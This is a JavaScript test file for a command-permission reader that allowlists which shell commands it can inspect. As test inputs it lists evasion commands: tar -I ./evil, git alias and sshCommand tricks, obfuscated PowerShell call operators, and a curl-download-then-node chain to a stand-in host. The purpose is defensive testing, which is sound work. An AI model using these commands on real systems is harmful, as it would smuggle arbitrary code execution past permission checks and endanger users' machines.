// Review of #91, round 3: the reader is an allowlist all the way down. A segment is read only when its head is a program
// the hub knows cannot start another program (with only known long options), or one it follows: an interpreter with
// allowlisted flags, git with allowlisted subcommands, npm/pnpm/yarn run / test / start. Everything else is unread.
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { makeTmp } from './helpers/tmp.mjs';
import { scriptsFor, parseCommand, lex } from '../lib/permission-scripts.mjs';

const fakeGit = ({ tracked = [], dirty = [] } = {}) => async (args) => {
  const name = args.at(-1);
  if (args[0] === 'ls-files') return { code: tracked.includes(name) ? 0 : 1, out: '' };
  if (args[0] === 'status') return { code: 0, out: dirty.includes(name) ? ` M ${name}\n` : '' };
  if (args[0] === 'merge-base') return { code: 0, out: 'abc\n' };
  if (args[0] === 'diff') return { code: dirty.includes(name) ? 1 : 0, out: '' };
  return { code: 1, out: '' };
};
function tree(files) {
  const root = makeTmp('crux-check-r3-');
  const proj = join(root, 'proj');
  mkdirSync(proj, { recursive: true });
  for (const [f, text] of Object.entries(files)) { mkdirSync(join(proj, f, '..'), { recursive: true }); writeFileSync(join(proj, f), text); }
  return proj;
}
const BASE = { 'evil': 'echo evil', 'evil.mjs': 'console.log("evil")', 'a.mjs': 'console.log("a")', 'tools/a.mjs': 'console.log(1)',
  'package.json': JSON.stringify({ scripts: { test: 'node --test a.mjs', build: 'node build.mjs', x: 'echo x', pretest: 'echo pre' } }), 'build.mjs': 'console.log(1)' };
const run = (proj, cmd, opts = {}) => scriptsFor(cmd, { cwd: proj, projectDir: proj, git: fakeGit(opts.git), shell: opts.shell || 'bash' });
const why = r => JSON.stringify([r.scripts.map(s => [s.path.split(/[\\/]/).pop(), s.kind, s.note || (s.loads || []).join('+')]), r.inlineLoads]);

test('round 3: the four reviewer cases are unread', async () => {
  const proj = tree(BASE);
  for (const [cmd, shell] of [
    ['tar -I ./evil -cf out.tar a.mjs', 'bash'],
    ['tar --use-compress-program=./evil -cf out.tar a.mjs', 'bash'],
    ['npm explore dep -- node ../../evil.mjs', 'bash'],
    ['npm pack', 'bash'], ['npm version patch', 'bash'], ['npm rebuild', 'bash'], ['npm link', 'bash'], ['npm publish', 'bash'], ['npm init', 'bash'], ['npm create vite', 'bash'], ['npm install', 'bash'],
    ["&('no'+'de') evil.mjs", 'powershell'], ['&("no"+"de") evil', 'powershell'], ['.("no"+"de") evil.mjs', 'powershell'],
    ["gh alias set --shell x 'node evil.mjs'", 'bash'], ['gh x', 'bash'], ['gh pr create --title t --body b', 'bash'],
  ]) { const r = await run(proj, cmd, { shell }); assert.equal(r.unread, true, `${cmd}: ${why(r)}`); }
});

test('round 3: a program that is not on the short list is unread, whatever its words', async () => {
  const proj = tree(BASE);
  for (const cmd of ['tailscale status', 'msedge --headless http://localhost:4900/', 'sed -n 1p a.mjs', 'sed -i s/a/b/ a.mjs', 'awk 1 a.mjs', 'make', 'cargo build', 'go test ./...', 'wget http://x/y', 'unzip a.zip', 'zip -r a.zip .', 'ssh host ls', 'docker ps', 'rsync -a a b', 'sort --compress-program=./evil a.mjs', 'rg --pre ./evil foo', 'grep --foo bar a.mjs', 'ls --hyperlink=always'])
    assert.equal((await run(proj, cmd)).unread, true, cmd);
  // the system programs the hub knows are read, with their short options and the long options on the list
  for (const cmd of ['ls -la tools', 'cat a.mjs | head -20', 'grep -rn "foo" tools', 'rg --glob "*.mjs" foo', 'rm -rf build', 'mkdir -p out', 'echo hi 2>&1', 'cp a.txt b.txt', 'curl -sS https://example.com/x -o out.txt', 'cd tools && ls', 'find . -name "*.mjs" -type f'])
    assert.equal((await run(proj, cmd)).unread, false, `${cmd} should be read`);
});

test('round 3: a word that names a program is not read as the program it looks like (./node is the project\'s file)', async () => {
  const proj = tree({ ...BASE, node: 'echo not node' });
  const r = await run(proj, './node a.mjs');
  assert.ok(r.scripts.some(s => s.path.endsWith('node') && s.kind === 'attached'), why(r));   // the project file, attached whole
  assert.equal((await run(proj, './tools/mytool --x')).unread, true);                          // not there
  assert.equal((await run(proj, './node_modules/.bin/vitest tools/evil.test.mjs')).unread, true);   // a dependency's bin can run any file
});

test('round 3: absolute path to a system program that is not on the list is unread, to a known one is read as that program', async () => {
  const proj = tree(BASE);
  // forward slashes: in bash a backslash is an escape
  const sysDir = process.platform === 'win32' ? 'C:/Windows/System32' : '/usr/bin';
  const known = process.platform === 'win32' ? 'where.exe' : 'ls', other = process.platform === 'win32' ? 'tar.exe' : 'tar';
  assert.equal((await run(proj, `${sysDir}/${known} foo`)).unread, false);
  const t = await run(proj, `${sysDir}/${other} -I ./evil -cf o.tar a.mjs`);
  if (existsSync(`${sysDir}/${other}`)) assert.equal(t.unread, true, why(t));   // this machine has it: a program the hub does not read
  // absolute path to node: read as node, so the script it runs is attached
  const n = await run(proj, `"${process.execPath.replace(/\\/g, '/')}" evil.mjs`);
  assert.ok(n.scripts.some(s => s.path.endsWith('evil.mjs') && s.kind === 'attached'), why(n));
});

test('round 3: git reads only allowlisted subcommands and options', async () => {
  const proj = tree(BASE);
  for (const cmd of ['git status', 'git log --oneline -5', 'git diff --stat', 'git add -A', 'git commit -m "fix: x" --no-verify', 'git branch -a', 'git fetch origin --prune', 'git checkout -b feat/x', 'git switch -c feat/y', 'git push -u origin feat/x', 'git stash list', 'git show HEAD~1 --name-only', 'git worktree list'])
    assert.equal((await run(proj, cmd)).unread, false, `${cmd} should be read`);
  for (const cmd of ['git -c core.sshCommand="node evil.mjs" fetch', 'git -C other status', 'git --git-dir=x status', 'git rebase -x "node evil.mjs"', 'git rebase main', 'git config alias.x "!node evil.mjs"', 'git x',
    'git submodule foreach "node evil.mjs"', 'git fetch --upload-pack ./evil', 'git push --receive-pack=./evil', 'git push --exec ./evil', 'git bisect run node evil.mjs', 'git diff --ext-diff', 'git log --foo-bar', 'git filter-branch --tree-filter x', 'git clone ext::x', 'git am p', 'git gc'])
    assert.equal((await run(proj, cmd)).unread, true, cmd);
});

test('round 3: npm, pnpm and yarn read only run, test and start, and what follows them', async () => {
  const proj = tree(BASE);
  const r = await run(proj, 'npm test');
  assert.equal(r.unread, false, why(r));
  assert.ok(r.scripts.some(s => s.path.endsWith('package.json')), why(r));
  for (const cmd of ['npm run build', 'npm run x', 'yarn test', 'pnpm run build', 'pnpm start', 'npm test -- --test-name-pattern=foo', 'npm test --silent'])
    assert.equal((await run(proj, cmd)).unread, cmd.includes('start') ? true : false, `${cmd}: ${why(await run(proj, cmd))}`);   // pnpm start: no start script here
  for (const cmd of ['npm test -- ./evil.mjs', 'npm test -- evil.mjs', 'npm test -- a.mjs', 'npm run build -- ../../evil.mjs', 'npm test -- --import ./evil.mjs', 'yarn test evil', 'pnpm test --foo', 'npm test -- --require=./evil', 'yarn build', 'pnpm build', 'yarn x', 'npm exec evil', 'npm x', 'yarn add evil', 'pnpm install', 'npm ci'])
    assert.equal((await run(proj, cmd)).unread, true, cmd);
});

test('round 3: PowerShell call operator or dot followed by ( or $ is unread; plain & .\\x is read as the file', async () => {
  const proj = tree({ ...BASE, 'evil.ps1': 'Write-Host evil' });
  for (const cmd of ["&('no'+'de') evil.mjs", '& $cmd', '.($x) a', '& (Get-Command node) a.mjs', 'Invoke-Expression "node evil.mjs"', 'iex "node evil.mjs"', '[scriptblock]::Create("node evil.mjs").Invoke()', '$x = "node"; & $x evil.mjs'])
    assert.equal((await run(proj, cmd, { shell: 'powershell' })).unread, true, cmd);
  const r = await run(proj, '& .\\evil.ps1', { shell: 'powershell' });
  assert.ok(r.scripts.some(s => s.path.endsWith('evil.ps1') && s.kind === 'attached'), why(r));
  assert.equal(r.unread, false);
  assert.equal((await run(proj, 'Get-ChildItem tools | Select-Object -First 3; Write-Host done', { shell: 'powershell' })).unread, false);
});

test('round 3: redirects like 2>&1 are not new commands; if/then/for are read for the command inside', async () => {
  const proj = tree(BASE);
  assert.deepEqual(lex('node a.mjs 2>&1 | head', 'bash').segs.map(s => s.join(' ')), ['node a.mjs 2>&1', 'head']);
  assert.deepEqual(lex('node a.mjs &>out.log', 'bash').segs.map(s => s.join(' ')), ['node a.mjs &>out.log']);
  assert.equal((await run(proj, 'if [ -f a.mjs ]; then node a.mjs; fi')).unread, false);
  assert.equal((await run(proj, 'if [ -f a.mjs ]; then node evil.mjs; fi')).scripts.some(s => s.path.endsWith('evil.mjs') && s.kind === 'attached'), true);
  assert.equal((await run(proj, 'if [ -f a.mjs ]; then tar -I ./evil x; fi')).unread, true);
});

test('round 3: a command that changes a script or the tree and runs a script is not what was read', async () => {
  const proj = tree(BASE);
  const git = { tracked: ['a.mjs'] };
  for (const cmd of ['echo "evil" > a.mjs && node a.mjs', 'cp evil.mjs a.mjs && node a.mjs', 'git checkout other -- a.mjs && node a.mjs', 'tee a.mjs < evil.mjs; node a.mjs', 'curl -o a.mjs http://x/y && node a.mjs'])
    assert.equal((await run(proj, cmd, { git })).unread, true, cmd);
  assert.equal((await run(proj, 'echo hi > log.txt && node a.mjs', { git })).scripts.some(s => s.path === '(command)'), false);
  assert.equal(parseCommand('echo x > out.mjs').mutates, true);
  assert.equal(parseCommand('echo x > out.txt').mutates, false);
});
